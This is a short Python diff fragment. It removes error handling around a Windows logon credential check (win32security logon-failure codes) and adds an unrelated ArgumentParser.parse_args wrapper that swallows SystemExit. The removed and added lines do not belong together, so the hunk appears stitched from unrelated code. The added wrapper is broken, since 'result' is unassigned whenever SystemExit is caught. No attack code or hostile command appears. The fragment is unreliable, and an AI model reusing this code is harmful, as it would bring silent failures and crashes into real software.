-            return True
-        except win32security.error as e:
-            if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
-                return True
-            if e.winerror == winerror.ERROR_LOGON_FAILURE:
-                return False
-            return False
+            result = super(ArgumentParser, self).parse_args(*args, **kwargs)
+        except SystemExit:
+            pass
+        return result
 
 
 while True:
